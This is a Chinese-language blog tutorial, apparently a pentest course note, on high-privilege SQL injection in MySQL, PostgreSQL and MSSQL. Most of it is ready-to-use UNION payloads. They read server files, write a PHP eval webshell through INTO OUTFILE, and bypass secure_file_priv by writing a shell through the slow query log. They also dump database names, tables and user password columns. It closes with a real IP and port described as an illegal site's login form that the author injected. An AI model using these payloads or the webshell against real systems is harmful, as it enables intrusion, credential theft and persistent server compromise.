![1645093889680-3cf9331e-511e-4787-9b3a-7c88e1e0ed8f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132246188-1958974073.png)

```plain
#知识点：
1、SQL注入-MYSQL数据库
2、SQL注入-MSSQL数据库
3、SQL注入-PostgreSQL数据库

#详细点：
Access无高权限注入点-只能猜解，还是暴力猜解
MYSQL，PostgreSQL，MSSQL高权限注入点-可升级读写执行等，还需要看具体有没有限制，能不能进行执行等等。
```

- #### MYSQL-root高权限读写注入

```plain
决定：连接的数据库用户
-读取文件：
UNION SELECT 1,load_file('d:/w.txt'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
```

![1645094020720-15ca1c67-4f8f-47e9-a828-c8ea32d90230.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303261-293150066.png)

```plain
数据库中正常读取文件：select load_file('d:/www.txt');
```

![1645094063862-0a2a37c0-4072-464d-ac5c-36b085da3016.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132302319-261252932.png)

```plain
-写入文件：
UNION SELECT 1,'xxxx',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile 'd:/www.txt'
数据库写文件：select 'xxx' into outfile 'd:/1.txt';
```

![1645094093079-afe12744-b75a-4ace-a979-8a2151f2c026.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132302421-603274635.png)

```plain
-路径获取：phpinfo,报错,字典等
https://blog.csdn.net/god_7z1/article/details/8725541
读取关键文件，可以在搜索关键函数等
读取关键配置文件：http://127.0.0.1:8081/web/mysql/news.php?id=1 UNION SELECT 1,load_file('D:\\phpstudy_pro\\WWW\\web\\mysql\\config\\conn.php'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
```

![1645094134449-87c0949c-52cb-40c1-9d59-a298b31059f8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132302510-1434426546.png)

```plain
Phpinfo :搜索语法：inurl:phpinfo
```

![1645094155844-bf37cc47-dc6d-4e0d-83be-f36d75072fb0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132302859-1012387135.png)

```plain
后门代码：
http://127.0.0.1:8081/web/mysql/news.php
?id=1 UNION SELECT 1,'<?php eval($_POST['x']);?>',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile 'D:\\phpstudy_pro\\WWW\\web\\mysql\\3.php'
```

![1645094204167-7b89ffa5-581c-45c4-8af5-65351a3c2943.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303162-1219520047.png)

```plain
-无法写入：secure_file_priv突破 v突破 注入中需要支持SQL执行环境，没有就需要借助
secure_file_priv会限制读写，如果有限制，则意味着只能在该盘符上进行操作。
phpmyadmin或能够直接连上对方数据库进行绕过，或者支持堆叠注入。
set global slow_query_log=1;
set global slow_query_log_file='shell路径';
select '<?php eval($_POST[A]);?>' or SLEEP(11);
访问shell路径，连接后门。
```

![1645094258153-067ee31d-6976-4910-ae1f-ede06442e60d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303177-397806947.png)

- #### PostgreSQL-高权限读写注入

```plain
-测列数：
order by 4
and 1=2 union select null,null,null,null
-测显位：第2，3
and 1=2 union select 'null',null,null,null 错误
and 1=2 union select null,'null',null,null 正常
and 1=2 union select null,null,'null',null 正常
and 1=2 union select null,null,null,'null' 错误
```

![1645094307341-6ed3ced5-33f0-4de9-b6e2-ce2647bd2d64.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132302842-1289601990.png)

```plain
-获取信息：
and 1=2 UNION SELECT null,version(),null,null
and 1=2 UNION SELECT null,current_user,null,null
```

![1645094364551-baada60d-1aa3-4871-a9d6-8219ac3d0876.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303093-525659061.png)

```plain
and 1=2 union select null,current_database(),null,null
```

![1645094607076-41a43dae-ad87-4808-b618-4944bedbc824.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303332-1002270372.png)

```plain
-获取数据库名：
and 1=2 union select null,string_agg(datname,','),null,null from pg_database
```

![1645094739659-b36ef26a-b4f0-483c-baec-409b323a3362.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303063-1250319251.png)

```plain
-获取表名：
1、and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public'
2、and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables
```

![1645094853779-ae4380f5-ce49-410d-9631-3df781be911f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303312-875727404.png)

```plain
-获取列名：
and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users'
```

![1645094853779-ae4380f5-ce49-410d-9631-3df781be911f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303879-1447463856.png)

```plain
-获取数据：
and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users
```

![1645094897111-990734e9-eb09-467d-8516-1ddb9f2a0633.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303162-984439264.png)

```plain
参考：https://www.freebuf.com/sectool/249371.html
-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：
and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE
```

![1645094943933-e918a70c-50ab-4112-82e0-b4b4b56fdfac.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303826-1023335221.png)

- #### MSSQL-sa高权限读写执行注入

```plain
-测列数：
order by 4
and 1=2 union all select null,null,null,null
-测显位：
and 1=2 union all select null,1,null,null
and 1=2 union all select null,null,'s',null
```

![1645094968419-84322941-5642-4224-9ac5-6a05e21a1cde.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303651-1887832285.png)

```plain
-获取信息：
@@version 获取版本信息
```

![1645095038343-e9c2d473-1c01-4ee6-9f16-95273eb4634d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132303918-1241656079.png)

```plain
db_name() 当前数据库名字
user、system_user,current_user,user_name 获取当前用户名
```

![1645095163807-f7a1b1fe-5282-4e6f-a0da-b52935d763be.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132304176-1498498150.png)

```plain
@@SERVERNAME 获取服务器主机信息
```

![1645095360000-b423419d-7e6f-4f76-8063-71305b8e7311.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132304311-619414573.png)

```plain
and 1=2 union all select null,db_name(),null,null
-获取表名：
and 1=2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,null
union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null
```

![1645095396759-ae59da1f-6ab6-49e1-acb6-0c6fc6c3caf4.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132304328-724088393.png)

```plain
-获取列名：
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null
```

![1645095460609-1318e417-b05a-4f9f-902f-39ea38f024af.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132304355-541134119.png)

```plain
• -获取数据：
and 1=2 union all select null,username, password ,null from manage
```

- #### 结尾彩蛋-某Q牌违法登陆框注入

```plain
116.206.94.133:888
已经关闭。
```